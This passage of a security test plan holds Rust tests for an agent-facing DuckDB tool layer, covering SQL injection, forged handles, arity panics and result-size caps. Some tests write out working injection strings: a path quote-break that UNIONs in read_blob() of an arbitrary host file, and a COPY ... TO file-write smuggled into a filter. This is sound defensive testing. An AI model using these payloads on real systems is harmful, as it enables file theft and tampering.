        let code = format!("to_rows(sort(register({p:?}), '(SELECT 1) DESC, region'))");
        let r = s.run_code(&code);
        let _ = std::fs::remove_dir_all(&dir);
        assert!(r.is_ok(), "KNOWN-GAP canary: the sort 'by' fragment is spliced raw after ORDER BY and accepts arbitrary expressions/subqueries, confirming it is an unsanitized SQL fragment. Local-only, capped result, no egress/write => CANARY; flips if the order list is ever validated.");
    }

    /// `HOLDS` — Negative-space probe distinguishing two write vectors: statement-in-expression (rejected, HOLDS) vs statement-after-semicolon (executes, the finding). Sharpens the root cause to execute_batch, not the splice.
    /// seam: engine_duckdb.rs filter_rows WHERE {where_sql} — single-statement parser boundary (statement-in-expression)
    #[test]
    fn filter_where_copy_to_inside_expression_is_rejected_holds() {
        let dir = tmp_dir("filter-copy");
        let p = sales_parquet(&dir);
        let leak = dir.join("expr_copy.csv");
        let leak_s = leak.to_str().unwrap().to_string();
        let _ = std::fs::remove_file(&leak);
        let mut s = Session::new("filter-copy").unwrap();
        // Smuggle a COPY (a statement) into an EXPRESSION position inside WHERE, WITHOUT a `;` separator.
        // DuckDB rejects COPY as a sub-expression, so this single-statement path cannot write — the write
        // only happens via the multi-statement `;` bug. Use a self-contained COPY (SELECT 1) so the ONLY
        // failure reason is the parser, not an unknown table name.
        let where_sql = format!("(COPY (SELECT 1) TO '{leak_s}')");
        let code = format!("to_rows(filter_rows(register({p:?}), {where_sql:?}))");
        let r = s.run_code(&code);
        let wrote = leak.exists();
        let _ = std::fs::remove_dir_all(&dir);
        assert!(r.is_err() && !wrote, "WRITE CONTRACT (single-statement): a COPY/statement cannot be smuggled into an EXPRESSION position inside a WHERE fragment — the parser rejects it and no file is written. This isolates the write escape to the multi-statement ';' path, not the fragment-as-expression path.");
    }

    /// `CANARY` — The existing register quote-break canary unions another PARQUET; this pivots the SAME path-splice to read_blob() of an ARBITRARY host file (the strongest, format-free local-read primitive) — a distinct exfil angle reaching the V1a gap through the register PATH position rather than the SQL body. CANARY per the accepted-gap rule, marked as a NEW distinct exfil ANGLE.
    /// seam: (gap-fill, coverage critic)
    #[test]
    fn register_path_quote_break_pivots_to_read_blob_arbitrary_file_canary() {
        let dir = tmp_dir("reg-path-blob");
        let p = sales_parquet(&dir);
        let secret = dir.join("secret.bin");
        std::fs::write(&secret, b"TOPSECRET-BLOB").unwrap();
        let secret_s = secret.to_str().unwrap().to_string();
        let mut s = Session::new("reg-path-blob").unwrap();
        // Close read_parquet('...'), UNION a read_blob() of an ARBITRARY non-parquet host file, comment the tail.
        // read_blob returns BLOB; cast its content to VARCHAR for `region` and a constant `amt` so it schema-matches.
        let evil = format!("{p}') UNION ALL SELECT CAST(content AS VARCHAR) AS region, CAST(0.0 AS DOUBLE) AS amt FROM read_blob('{secret_s}') --");
        let code = format!("to_rows(register({evil:?}))");
        let out = s.run_code(&code).expect("KNOWN GAP: register path quote-break + read_blob of an arbitrary file currently parses");
        let leaked = format!("{out:?}");
        let _ = std::fs::remove_dir_all(&dir);
        assert!(leaked.contains("TOPSECRET-BLOB"), "KNOWN-GAP canary: the register PATH splice (read_parquet('{path}')) can quote-break and UNION in read_blob() of an ARBITRARY non-parquet host file, exfiltrating its bytes through to_rows. Distinct from the parquet-union canary: this pivots the PATH position to the generic read_blob local-read primitive (V1a gap), proving the splice is not limited to parquet readers. Flips when the path is bound as a parameter at the V3 load boundary.");
    }
```

- [ ] **Step 2: Run + triage**

Run: `RUST_MIN_STACK=16777216 cargo test -p droplet-core security::sql_injection`
Expected: HOLDS green; triage PROBE/CANARY per the Probe protocol (PROBE red → finding ledger + convert to CANARY; CANARY red → gap closed, flip).

- [ ] **Step 3: Commit**

```bash
git add -A && git commit -m "test(security): sql_injection adversarial angles (16 tests)"
```

---

## Task 7: Handle/registry forgery + arg-conversion seam + macro arity (27 angles)

**Files:** Create `crates/droplet-core/src/security/handles_args.rs`. **Reference seams:** `convert.rs` FromArg/IntoRet, `registry.rs` Registry, the `#[droplet_tool]` thunk's `args[i]` indexing.
**Interfaces — Consumes:** the Task 1 helper kit (dispatch/catch_dispatch/tmp_dir/sales_parquet).

- [ ] **Step 1: Write the class file (full code)**

```rust
// crates/droplet-core/src/security/handles_args.rs
//! Handle/registry forgery + arg-conversion seam + macro arity — adversarial angles. seam: `convert.rs` FromArg/IntoRet, `registry.rs` Registry, the `#[droplet_tool]` thunk's `args[i]` indexing.
#![allow(unused_imports)]
use monty::MontyObject;
use crate::DropletError;
use crate::session::Session;
use crate::engine_duckdb::{DuckEngine, Dataset, DEFAULT_MAX_RESULT_ROWS};
use crate::registry::Registry;
use crate::tool::{Tool, ToolCx};
use super::{dispatch, catch_dispatch, tmp_dir, sales_parquet, write_parquet, list_len};

    /// `HOLDS` — Baseline invariant #6 forgery: a valid positive i64 never issued must miss the registry -> BadHandle, not panic/empty. Family anchor.
    /// seam: convert.rs Dataset::from_arg -> registry.rs Registry::require; to_rows in tools.rs
    #[test]
    fn to_rows_unissued_handle_is_bad_handle() {
        let err = dispatch("to_rows", &[MontyObject::Int(999)]).unwrap_err();
        assert!(matches!(err, DropletError::BadHandle(999)), "got {err:?}");
    }

    /// `HOLDS` — Signed->unsigned edge: a NEGATIVE Int passes i64::from_monty but fails u64::try_from BEFORE the registry lookup -> BadArg('dataset handle must be non-negative'), distinct from BadHandle.
    /// seam: convert.rs Dataset::from_arg u64::try_from(i64) guard (convert.rs:192-193)
    #[test]
    fn to_rows_negative_handle_is_bad_arg_non_negative() {
        let err = dispatch("to_rows", &[MontyObject::Int(-1)]).unwrap_err();
        assert!(matches!(err, DropletError::BadArg(m) if m.contains("non-negative")), "got {err:?}");
    }

    /// `HOLDS` — BadArg/BadHandle boundary: 2**62 is a positive i64 so u64::try_from SUCCEEDS (no over-rejection), but registry never issued it -> BadHandle. Confirms the non-negativity guard does not clamp large valid handles.
    /// seam: convert.rs Dataset::from_arg (u64::try_from succeeds) -> registry miss
    #[test]
    fn to_rows_huge_but_valid_i64_handle_is_bad_handle() {
        let err = dispatch("to_rows", &[MontyObject::Int(1i64 << 62)]).unwrap_err();
        assert!(matches!(err, DropletError::BadHandle(h) if h == (1u64 << 62)), "got {err:?}");
    }

    /// `HOLDS` — Type-confusion via integer overflow: 2**63 > i64::MAX so monty represents it as the DISTINCT MontyObject::BigInt variant; i64::from_monty's catch-all rejects it -> BadArg before any handle logic. Attacks the Int-vs-BigInt variant split.
    /// seam: convert.rs Dataset::from_arg -> i64::from_monty matches ONLY Int; BigInt arm is BadArg
    #[test]
    fn to_rows_2pow63_overflows_to_bigint_is_bad_arg() {
        let big = num_bigint::BigInt::from(1u128 << 63); let err = dispatch("to_rows", &[MontyObject::BigInt(big)]).unwrap_err();
        assert!(matches!(err, DropletError::BadArg(m) if m.contains("expected int")), "got {err:?}");
    }

    /// `HOLDS` — Handle smuggled as text '0': must NOT be str->int coerced into a handle. Distinct variant arm from float/list/bytes.
    /// seam: convert.rs i64::from_monty catch-all (String arm)
    #[test]
    fn to_rows_string_handle_is_bad_arg() {
        let err = dispatch("to_rows", &[MontyObject::String("0".into())]).unwrap_err();
        assert!(matches!(err, DropletError::BadArg(m) if m.contains("expected int")), "got {err:?}");
    }

    /// `HOLDS` — Float 0.0 numerically equals handle 0 but is a different variant; proves no float->int truncation aliases the first-issued handle. Distinct gadget from the str case.
    /// seam: convert.rs i64::from_monty catch-all (Float arm)
    #[test]
    fn to_rows_float_handle_is_bad_arg() {
        let err = dispatch("to_rows", &[MontyObject::Float(0.0)]).unwrap_err();
        assert!(matches!(err, DropletError::BadArg(m) if m.contains("expected int")), "got {err:?}");
    }

    /// `HOLDS` — A list wrapping a valid handle int must not be destructured into a handle. Attacks scalar-vs-sequence confusion: the scalar Dataset path must NOT route through as_seq.
    /// seam: convert.rs i64::from_monty catch-all (List arm) — scalar-vs-sequence
    #[test]
    fn to_rows_list_handle_is_bad_arg() {
        let err = dispatch("to_rows", &[MontyObject::List(vec![MontyObject::Int(0)])]).unwrap_err();
        assert!(matches!(err, DropletError::BadArg(m) if m.contains("expected int")), "got {err:?}");
    }

    /// `HOLDS` — Hack-Monty 'bytes object replacing a primitive': 8 zero bytes (LE u64 0) must NOT be reinterpreted/transmuted as the 8-byte handle. Distinct variant arm.
    /// seam: convert.rs i64::from_monty catch-all (Bytes arm)
    #[test]
    fn to_rows_bytes_handle_is_bad_arg() {
        let err = dispatch("to_rows", &[MontyObject::Bytes(vec![0u8, 0, 0, 0, 0, 0, 0, 0])]).unwrap_err();
        assert!(matches!(err, DropletError::BadArg(m) if m.contains("expected int")), "got {err:?}");
    }

    /// `HOLDS` — Tuple is the OTHER as_seq-matchable variant. The scalar handle path must still reject it -> proves the Dataset arg does NOT go through as_seq. Distinct from List (Vec<(String,Dataset)> DOES accept tuples, but the scalar arg must not).
    /// seam: convert.rs i64::from_monty catch-all (Tuple arm)
    #[test]
    fn to_rows_tuple_handle_is_bad_arg() {
        let err = dispatch("to_rows", &[MontyObject::Tuple(vec![MontyObject::Int(0)])]).unwrap_err();
        assert!(matches!(err, DropletError::BadArg(m) if m.contains("expected int")), "got {err:?}");
    }

    /// `HOLDS` — Off-by-one / first-handle forgery: 0 is the FIRST id the monotonic counter ever issues; guessing 0 before any register must miss. Distinct from the arbitrary-999 angle.
    /// seam: registry.rs Registry::require on empty registry (next==0, no items)
    #[test]
    fn fresh_session_to_rows_zero_is_bad_handle_empty_registry() {
        let err = dispatch("to_rows", &[MontyObject::Int(0)]).unwrap_err();
        assert!(matches!(err, DropletError::BadHandle(0)), "got {err:?}");
    }

    /// `HOLDS` — Cross-session handle confusion: handle 0 is valid in A but each Session owns its own Registry, so the same int must miss in B. Attacks ambient/global handle namespacing via the REAL Session surface, not the dispatch helper.
    /// seam: session.rs per-Session Registry isolation (handles field, session.rs:26/63) + Dataset::from_arg
    #[test]
    fn cross_session_handle_zero_invalid_in_fresh_session() {
        let path = format!("{}/tests/data/sample.parquet", env!("CARGO_MANIFEST_DIR")); let mut a = Session::new("forge-a").unwrap(); let h = a.run_code(&format!("register({path:?})")).unwrap(); assert!(matches!(h, MontyObject::Int(0))); let mut b = Session::new("forge-b").unwrap(); let err = b.run_code("to_rows(0)").unwrap_err();
        assert!(matches!(err, DropletError::BadHandle(0)), "session B must not resolve session A's handle 0, got {err:?}");
    }

    /// `HOLDS` — Partial-validity forgery: one real + one forged handle. Each Dataset param resolves independently; a valid left must NOT launder a forged right. Attacks multi-handle tools where a good handle might mask a bad one.
    /// seam: convert.rs Dataset::from_arg per-arg in the join thunk (left valid, right forged)
    #[test]
    fn join_mixed_valid_and_forged_handle_is_bad_handle() {
        let path = format!("{}/tests/data/sample.parquet", env!("CARGO_MANIFEST_DIR")); let mut engine = crate::engine_duckdb::DuckEngine::new_in_memory().unwrap(); let mut handles = crate::registry::Registry::new(); let mut cx = crate::tool::ToolCx { engine: &mut engine, handles: &mut handles }; let reg = inventory::iter::<crate::tool::Tool>().find(|t| t.name=="register").unwrap(); let h = (reg.dispatch)(&mut cx, &[MontyObject::String(path)], &[]).unwrap(); let jn = inventory::iter::<crate::tool::Tool>().find(|t| t.name=="join").unwrap(); let err = (jn.dispatch)(&mut cx, &[h, MontyObject::Int(999), MontyObject::String("l.id = r.id".into())], &[]).unwrap_err();
        assert!(matches!(err, DropletError::BadHandle(999)), "forged RIGHT handle must fail even with a valid left, got {err:?}");
    }

    /// `HOLDS` — Forgery laundered through the COMPOUND arg list[tuple[str,Dataset]]; the handle is nested two levels deep and resolution must still hit the registry and miss. Distinct seam from the scalar Dataset arg.
    /// seam: convert.rs Vec<(String,Dataset)>::from_arg -> Dataset::from_arg on the nested handle (convert.rs:205-218)
    #[test]
    fn local_sql_forged_handle_in_dataset_list_is_bad_handle() {
        let arg = MontyObject::List(vec![MontyObject::Tuple(vec![MontyObject::String("usage".into()), MontyObject::Int(4242)])]); let err = dispatch("local_sql", &[MontyObject::String("SELECT 1".into()), arg]).unwrap_err();
        assert!(matches!(err, DropletError::BadHandle(4242)), "forged handle inside the dataset list must surface BadHandle, got {err:?}");
    }

    /// `HOLDS` — Shape confusion: a str where list[str] is required. as_seq rejects String (only List|Tuple) -> BadArg BEFORE any SQL. Uses a REAL handle so the failure is provably the arg shape, not the handle.
    /// seam: convert.rs Vec<String>::from_arg via as_seq (String is not List|Tuple, convert.rs:128)
    #[test]
    fn group_agg_str_for_by_list_is_bad_arg() {
        let path = format!("{}/tests/data/sample.parquet", env!("CARGO_MANIFEST_DIR")); let mut engine = crate::engine_duckdb::DuckEngine::new_in_memory().unwrap(); let mut handles = crate::registry::Registry::new(); let mut cx = crate::tool::ToolCx { engine: &mut engine, handles: &mut handles }; let reg = inventory::iter::<crate::tool::Tool>().find(|t| t.name=="register").unwrap(); let h = (reg.dispatch)(&mut cx, &[MontyObject::String(path)], &[]).unwrap(); let ga = inventory::iter::<crate::tool::Tool>().find(|t| t.name=="group_agg").unwrap(); let metrics = MontyObject::List(vec![MontyObject::Tuple(vec![MontyObject::String("t".into()), MontyObject::String("SUM(amount)".into())])]); let err = (ga.dispatch)(&mut cx, &[h, MontyObject::String("region".into()), metrics], &[]).unwrap_err();
        assert!(matches!(err, DropletError::BadArg(m) if m.contains("list[str]")), "a bare str for the `by` list must be BadArg, got {err:?}");
    }

    /// `HOLDS` — Element-type confusion: correctly-shaped List but ints not strs. String::from_monty rejects each in the collect() -> BadArg. Distinct from the wrong-container angle; attacks per-element conversion.
    /// seam: convert.rs Vec<String>::from_arg element loop (String::from_monty on Int, convert.rs:130)
    #[test]
    fn group_agg_ints_for_str_list_is_bad_arg() {
        let path = format!("{}/tests/data/sample.parquet", env!("CARGO_MANIFEST_DIR")); let mut engine = crate::engine_duckdb::DuckEngine::new_in_memory().unwrap(); let mut handles = crate::registry::Registry::new(); let mut cx = crate::tool::ToolCx { engine: &mut engine, handles: &mut handles }; let reg = inventory::iter::<crate::tool::Tool>().find(|t| t.name=="register").unwrap(); let h = (reg.dispatch)(&mut cx, &[MontyObject::String(path)], &[]).unwrap(); let ga = inventory::iter::<crate::tool::Tool>().find(|t| t.name=="group_agg").unwrap(); let by = MontyObject::List(vec![MontyObject::Int(1), MontyObject::Int(2)]); let metrics = MontyObject::List(vec![MontyObject::Tuple(vec![MontyObject::String("t".into()), MontyObject::String("SUM(amount)".into())])]); let err = (ga.dispatch)(&mut cx, &[h, by, metrics], &[]).unwrap_err();
        assert!(matches!(err, DropletError::BadArg(m) if m.contains("expected str")), "int elements in the `by` list must be BadArg, got {err:?}");
    }

    /// `HOLDS` — Over-arity inner tuple: the refutable `let [a,b] = pair else {..}` must reject a 3-element tuple as 'expected a 2-tuple' (NOT panic, NOT silently take first two). Attacks the irrefutable-pattern assumption.
    /// seam: convert.rs Vec<(String,String)>::from_arg slice-pattern `let [a,b] = pair` (convert.rs:141-143)
    #[test]
    fn group_agg_three_tuple_metric_is_bad_arg() {
        let path = format!("{}/tests/data/sample.parquet", env!("CARGO_MANIFEST_DIR")); let mut engine = crate::engine_duckdb::DuckEngine::new_in_memory().unwrap(); let mut handles = crate::registry::Registry::new(); let mut cx = crate::tool::ToolCx { engine: &mut engine, handles: &mut handles }; let reg = inventory::iter::<crate::tool::Tool>().find(|t| t.name=="register").unwrap(); let h = (reg.dispatch)(&mut cx, &[MontyObject::String(path)], &[]).unwrap(); let ga = inventory::iter::<crate::tool::Tool>().find(|t| t.name=="group_agg").unwrap(); let by = MontyObject::List(vec![MontyObject::String("region".into())]); let metrics = MontyObject::List(vec![MontyObject::Tuple(vec![MontyObject::String("t".into()), MontyObject::String("SUM(amount)".into()), MontyObject::String("extra".into())])]); let err = (ga.dispatch)(&mut cx, &[h, by, metrics], &[]).unwrap_err();
        assert!(matches!(err, DropletError::BadArg(m) if m.contains("2-tuple")), "a 3-tuple metric must be rejected, got {err:?}");
    }

    /// `HOLDS` — Under-arity inner tuple (mirror of the 3-tuple): the slice pattern must also reject a 1-element tuple. Under-indexing is where an args[1]-style bug would hide; here the refutable pattern protects it. Distinct boundary.
    /// seam: convert.rs Vec<(String,String)>::from_arg slice-pattern on a 1-element tuple (convert.rs:141-143)
    #[test]
    fn group_agg_one_tuple_metric_is_bad_arg() {
        let path = format!("{}/tests/data/sample.parquet", env!("CARGO_MANIFEST_DIR")); let mut engine = crate::engine_duckdb::DuckEngine::new_in_memory().unwrap(); let mut handles = crate::registry::Registry::new(); let mut cx = crate::tool::ToolCx { engine: &mut engine, handles: &mut handles }; let reg = inventory::iter::<crate::tool::Tool>().find(|t| t.name=="register").unwrap(); let h = (reg.dispatch)(&mut cx, &[MontyObject::String(path)], &[]).unwrap(); let ga = inventory::iter::<crate::tool::Tool>().find(|t| t.name=="group_agg").unwrap(); let by = MontyObject::List(vec![MontyObject::String("region".into())]); let metrics = MontyObject::List(vec![MontyObject::Tuple(vec![MontyObject::String("only".into())])]); let err = (ga.dispatch)(&mut cx, &[h, by, metrics], &[]).unwrap_err();
        assert!(matches!(err, DropletError::BadArg(m) if m.contains("2-tuple")), "a 1-tuple metric must be rejected, got {err:?}");
    }

    /// `HOLDS` — Tuple-position confusion: alias is str (correct) but the 2nd element is a str instead of an int handle. Dataset::from_arg -> i64::from_monty rejects the wrong VARIANT. Distinct from the forged-int-handle angle (valid int that missed the registry).
    /// seam: convert.rs Vec<(String,Dataset)>::from_arg -> Dataset::from_arg on a String 2nd elem (convert.rs:214)
    #[test]
    fn local_sql_second_elem_wrong_type_str_not_handle_is_bad_arg() {
        let arg = MontyObject::List(vec![MontyObject::Tuple(vec![MontyObject::String("usage".into()), MontyObject::String("not_a_handle".into())])]); let err = dispatch("local_sql", &[MontyObject::String("SELECT 1".into()), arg]).unwrap_err();
        assert!(matches!(err, DropletError::BadArg(m) if m.contains("expected int")), "a str where a Dataset handle is required must be BadArg, got {err:?}");
    }

    /// `HOLDS` — Structural confusion one level up: outer list is fine but its element is a bare Int instead of a (str, handle) tuple. The inner as_seq must reject the scalar. Distinct from wrong-element-inside-tuple; here there is no tuple at all.
    /// seam: convert.rs Vec<(String,Dataset)>::from_arg inner as_seq (convert.rs:210)
    #[test]
    fn local_sql_dataset_list_inner_not_a_tuple_is_bad_arg() {
        let arg = MontyObject::List(vec![MontyObject::Int(0)]); let err = dispatch("local_sql", &[MontyObject::String("SELECT 1".into()), arg]).unwrap_err();
        assert!(matches!(err, DropletError::BadArg(m) if m.contains("tuple[str, Dataset]")), "a non-tuple element in the dataset list must be BadArg, got {err:?}");
    }

    /// `PROBE` — Headline arity-panic finding. monty cannot validate host-tool arity (ext fns opaque), so the agent controls args.len(); the thunk evaluates args[1] out of bounds -> panic unwinding through run_code into the host. Contract: contained Err, never panic.
    /// seam: macros/src/lib.rs:70 thunk `&args[#indices]` direct indexing; session.rs:113 dispatch has NO catch_unwind
    #[test]
    fn PROBE_query_missing_arg_must_not_panic() {
        let res = catch_dispatch("query", &[MontyObject::String("/tmp/x.parquet".into())]);
        assert!(res.is_ok(), "FINDING: the macro thunk panicked on a missing arg (args[1] out of bounds) instead of a contained Err; an agent can crash the host with query('x')"); assert!(matches!(res.unwrap(), Err(DropletError::BadArg(_))), "too-few-args must surface a contained BadArg");
    }

    /// `PROBE` — Distinct from too-few-positional: ALL args are keyword. The thunk's `_kwargs` is unused (macros/src/lib.rs:67), so positional args is empty and args[0] panics. Doubly a finding: kwargs silently dropped AND empty-args index panics.
    /// seam: macros/src/lib.rs thunk ignores _kwargs (line 67) + args[0] indexing on empty args
    #[test]
    fn PROBE_query_kwargs_only_must_not_panic() {
        let res = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| dispatch_kw("query", &[], &[(MontyObject::String("sql".into()), MontyObject::String("SELECT 1".into()))]));
        assert!(res.is_ok(), "FINDING: kwargs-only call panicked (thunk ignores kwargs and indexes args[0] on an empty args vec)"); assert!(matches!(res.unwrap(), Err(DropletError::BadArg(_))), "kwargs-only call must surface a contained BadArg, not silently drop kwargs");
    }

    /// `PROBE` — Over-arity twin of the missing-arg probe: the thunk indexes args[0]/args[1] and ignores args[2], so the call SUCCEEDS with a silently-dropped arg — a contract violation distinct from a panic. Attacks the absence of an args.len()==N check.
    /// seam: macros/src/lib.rs thunk indexes only args[0..N]; extra args silently dropped (no len check)
    #[test]
    fn PROBE_query_too_many_args_must_not_panic_or_silently_ignore() {
        let path = format!("{}/tests/data/sample.parquet", env!("CARGO_MANIFEST_DIR")); let res = catch_dispatch("query", &[MontyObject::String(path), MontyObject::String("SELECT * FROM data".into()), MontyObject::String("EXTRA".into())]);
        assert!(res.is_ok(), "too-many-args must not panic"); let inner = res.unwrap(); assert!(matches!(inner, Err(DropletError::BadArg(_))), "FINDING: a 3-arg call to 2-arg `query` was NOT rejected as an arity error (extra arg silently dropped); arity mismatch must be a contained BadArg, not silent truncation. got {inner:?}");
    }

    /// `PROBE` — Arity panic on a DIFFERENT, higher-arity, handle-first tool (3 params). Confirms the args[i] panic is SYSTEMIC across the macro, not query-specific. Distinct tool/seam from the query probes.
    /// seam: macros/src/lib.rs thunk args[2] on a 2-arg call to the 3-param group_agg
    #[test]
    fn PROBE_group_agg_missing_metrics_arg_must_not_panic() {
        let by = MontyObject::List(vec![MontyObject::String("region".into())]); let res = catch_dispatch("group_agg", &[MontyObject::Int(0), by]);
        assert!(res.is_ok(), "FINDING: group_agg panicked on a missing `metrics` arg (args[2] out of bounds) instead of a contained Err"); assert!(matches!(res.unwrap(), Err(_)), "missing metrics must surface a contained Err");
    }

    /// `PROBE` — Minimal arity panic: zero args to a one-arg tool. Smallest reproduction of the args[0] OOB crash; isolates the panic from any handle/registry logic. Distinct minimal-case angle.
    /// seam: macros/src/lib.rs thunk args[0] on an EMPTY args slice (1-param tool)
    #[test]
    fn PROBE_to_rows_zero_args_must_not_panic() {
        let res = catch_dispatch("to_rows", &[]);
        assert!(res.is_ok(), "FINDING: to_rows() with no args panicked (args[0] out of bounds on empty args)"); assert!(matches!(res.unwrap(), Err(DropletError::BadArg(_))), "a no-arg call must surface a contained BadArg");
    }

    /// `HOLDS` — String-param confusion at the entry tool: an int where the parquet PATH (str) is required must be BadArg before any FS touch. Confirms register doesn't treat an int as a pre-existing handle.
    /// seam: convert.rs String::from_monty (Int arm) via register's first visible param
    #[test]
    fn register_int_path_is_bad_arg_not_panic() {
        let err = dispatch("register", &[MontyObject::Int(7)]).unwrap_err();
        assert!(matches!(err, DropletError::BadArg(m) if m.contains("expected str")), "got {err:?}");
    }

    /// `HOLDS` — Resolution-ordering: scalar takes (Dataset, expr). The forged handle must fail at from_arg (BadHandle) BEFORE the agent SQL expr compiles — proving handle validation gates SQL execution. Distinct from to_rows (scalar carries a 2nd SQL arg that must NOT run first).
    /// seam: convert.rs from_arg ordering: handle resolved (arg 0) BEFORE the expr str reaches the engine
    #[test]
    fn scalar_forged_handle_is_bad_handle_before_sql() {
        let err = dispatch("scalar", &[MontyObject::Int(31337), MontyObject::String("SUM(amount)".into())]).unwrap_err();
        assert!(matches!(err, DropletError::BadHandle(31337)), "a forged handle must fail at resolution, not as a SQL error, got {err:?}");
    }

    /// `HOLDS` — BOTH handles forged, pinning that the LEFT (first-evaluated) fails first -> confirms left-to-right positional resolution and that join with neither issued never silently joins empty views. Distinct from the mixed valid/invalid test (left valid, right forged).
    /// seam: convert.rs Dataset::from_arg on join's FIRST (left) param via fresh empty registry; left-to-right ordering
    #[test]
    fn join_first_handle_forged_is_bad_handle_left_arg() {
        let err = dispatch("join", &[MontyObject::Int(1), MontyObject::Int(2), MontyObject::String("l.id = r.id".into())]).unwrap_err();
        assert!(matches!(err, DropletError::BadHandle(1)), "the LEFT forged handle must fail first, got {err:?}");
    }
```

- [ ] **Step 2: Run + triage**

Run: `RUST_MIN_STACK=16777216 cargo test -p droplet-core security::handles_args`
Expected: HOLDS green; triage PROBE/CANARY per the Probe protocol (PROBE red → finding ledger + convert to CANARY; CANARY red → gap closed, flip).

- [ ] **Step 3: Commit**

```bash
git add -A && git commit -m "test(security): handles_args adversarial angles (27 tests)"
```

---

## Task 8: Result-cap / boundary-volume (invariant #6) (11 angles)

**Files:** Create `crates/droplet-core/src/security/result_cap.rs`. **Reference seams:** `engine_duckdb.rs` row cap + `run_code`'s uncapped final return value.
**Interfaces — Consumes:** the Task 1 helper kit (dispatch/catch_dispatch/tmp_dir/sales_parquet).

- [ ] **Step 1: Write the class file (full code)**

```rust
// crates/droplet-core/src/security/result_cap.rs
//! Result-cap / boundary-volume (invariant #6) — adversarial angles. seam: `engine_duckdb.rs` row cap + `run_code`'s uncapped final return value.
#![allow(unused_imports)]
use monty::MontyObject;
use crate::DropletError;
use crate::session::Session;
use crate::engine_duckdb::{DuckEngine, Dataset, DEFAULT_MAX_RESULT_ROWS};
use crate::registry::Registry;
use crate::tool::{Tool, ToolCx};
use super::{dispatch, catch_dispatch, tmp_dir, sales_parquet, write_parquet, list_len};

    /// `HOLDS` — Cap on the pure handle/to_rows value-move seam where rows never touch a parquet file (distinct from the register_parquet/query path).
    /// seam: engine_duckdb.rs to_rows LIMIT clamp + cap_batches over a pure handle; tools.rs to_rows/local_sql; session.rs run_code suspend/resume
    #[test]
    fn cap_holds_via_to_rows_handle_path_2500_to_1000() {
        let mut s = Session::new("rc-torows-2500").unwrap();
        // 2500-row dataset built entirely as a HANDLE (range view, no parquet file), then crossed via to_rows.
        let out = s.run_code("to_rows(local_sql('SELECT * FROM range(2500)', []))").unwrap();
        assert_eq!(list_len(&out), DEFAULT_MAX_RESULT_ROWS, "to_rows() over a pure handle must clamp 2500 -> 1000 just like query()"); // expected: 1000
    }

    /// `HOLDS` — Boundary arithmetic: probes the precise off-by-one at the cap edge (LIMIT 1000 vs the cap_batches .min()), a mechanism a bulk 2500-row test cannot expose.
    /// seam: engine_duckdb.rs to_rows 'SELECT ... LIMIT {cap}' arithmetic + cap_batches at the exact clamp edge
    #[test]
    fn cap_off_by_one_boundary_1001_clamps_to_1000() {
        let dir = tmp_dir("rc-offbyone");
        let p = sales_parquet(&dir);
        let mut s = Session::new("rc-offbyone").unwrap();
        let out = s.run_code(&format!("query({p:?}, 'SELECT * FROM range(1001)')")).unwrap();
        let _ = std::fs::remove_dir_all(&dir);
        assert_eq!(list_len(&out), DEFAULT_MAX_RESULT_ROWS, "cap+1 rows must clamp to exactly the cap, never let one extra row through"); // expected: 1000 not 1001
    }

    /// `PROBE` — Attacks the cap's UNIT: it counts rows, never columns/cells. One ultra-wide row is the canonical bypass the row-count cap structurally cannot see.
    /// seam: engine_duckdb.rs to_rows_values column loop (no width bound) + convert.rs Rows::into_monty (one Dict per row, one pair per column)
    #[test]
    fn cap_is_on_rows_not_cells_wide_row_crosses_fully() {
        let dir = tmp_dir("rc-wide");
        let p = sales_parquet(&dir);
        let mut s = Session::new("rc-wide").unwrap();
        let cols = (0..10000).map(|i| format!("{i} AS c{i}")).collect::<Vec<_>>().join(", ");
        let out = s.run_code(&format!("query({p:?}, 'SELECT {cols}')")).unwrap();
        let _ = std::fs::remove_dir_all(&dir);
        assert_eq!(list_len(&out), 1, "one row");
        let MontyObject::List(items) = &out else { panic!("expected list") };
        let MontyObject::Dict(pairs) = &items[0] else { panic!("expected dict row") };
        let ncols = pairs.clone().into_iter().count();
        // CONTRACT WE REQUIRE: invariant #6 should bound total CELLS crossing, not just rows. A single 10k-column row crossing whole is an unbounded-width channel.
        assert!(ncols <= 4096, "FINDING: result cap is row-count only; a 1-row x {ncols}-column result crosses fully, so column width is an unbounded boundary-volume channel (invariant #6 bounds rows, not cells)");
    }

    /// `PROBE` — Distinct from the wide-row angle: the channel here is per-CELL byte length, not column count. The row cap is structurally blind to string size.
    /// seam: engine_duckdb.rs cell_value StringArray -> Value::Str(.to_string()) (no length bound); convert.rs Value::Str -> MontyObject::String
    #[test]
    fn cap_does_not_bound_per_cell_byte_size() {
        let dir = tmp_dir("rc-bigstr");
        let p = sales_parquet(&dir);
        let mut s = Session::new("rc-bigstr").unwrap();
        // One row, one column, but the single cell is a ~50MB string built in SQL via repeat().
        let out = s.run_code(&format!("query({p:?}, \"SELECT repeat('x', 50000000) AS big\")")).unwrap();
        let _ = std::fs::remove_dir_all(&dir);
        let MontyObject::List(items) = &out else { panic!("expected list") };
        let MontyObject::Dict(pairs) = &items[0] else { panic!("expected dict") };
        let mut cell_len = 0usize;
        for (_k, v) in pairs.clone().into_iter() { if let MontyObject::String(big) = v { cell_len = big.len(); } }
        // CONTRACT WE REQUIRE: the result cap should bound BYTES crossing, not just rows. A single 50MB cell inside 1 capped row defeats invariant #6's size intent.
        assert!(cell_len <= 10_000_000, "FINDING: a single {cell_len}-byte cell crosses inside 1 capped row; result cap bounds row COUNT but not per-cell BYTE size (boundary-volume / snapshot-size channel)");
    }

    /// `PROBE` — The cap is on the ENGINE seam; the run_code value seam is a completely different exit. An agent never needs a tool to flood the boundary.
    /// seam: session.rs run_code ReplProgress::Complete value path (the cap lives in the ENGINE read-out, not on the run_code return)
    #[test]
    fn cap_does_not_bound_agent_built_final_return_value() {
        let mut s = Session::new("rc-agent-ret").unwrap();
        // The agent fabricates a giant list in its OWN Monty code (no tool, no engine) and returns it.
        let out = s.run_code("[0]*1000000").unwrap();
        // CONTRACT WE REQUIRE: nothing larger than the cap should cross the run_code boundary. The engine cap is bypassed because the list is agent-fabricated, not engine-produced.
        assert!(list_len(&out) <= DEFAULT_MAX_RESULT_ROWS, "FINDING: run_code's final return value is uncapped; agent-built [0]*1_000_000 crosses whole ({} elements). invariant #6's cap only guards engine read-outs (to_rows/query), not the program's own return value", list_len(&out));
    }

    /// `HOLDS` — Numeric boundary correctness: a scalar read-out that overflows i64 must fail loudly, not silently truncate a value crossing the boundary.
    /// seam: engine_duckdb.rs scalar_i64 'CAST({expr} AS BIGINT)' where expr overflows INT64 during evaluation; tools.rs scalar
